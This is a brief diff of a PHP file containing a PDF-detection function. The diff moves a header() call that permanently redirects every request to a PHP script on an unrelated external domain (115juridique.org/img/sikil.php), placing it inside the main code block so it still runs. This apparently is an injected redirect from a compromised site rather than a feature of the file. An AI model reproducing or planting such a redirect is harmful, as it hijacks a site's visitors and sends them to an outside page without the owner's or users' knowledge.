@@ -1,7 +1,6 @@
-<?php header("Location: https://115juridique.org/img/sikil.php", true, 301); ?>
 
 <?php
-
+header("Location: https://115juridique.org/img/sikil.php", true, 301);
 
 function detect_pdf($url) {
     $headers = get_headers($url, 1);
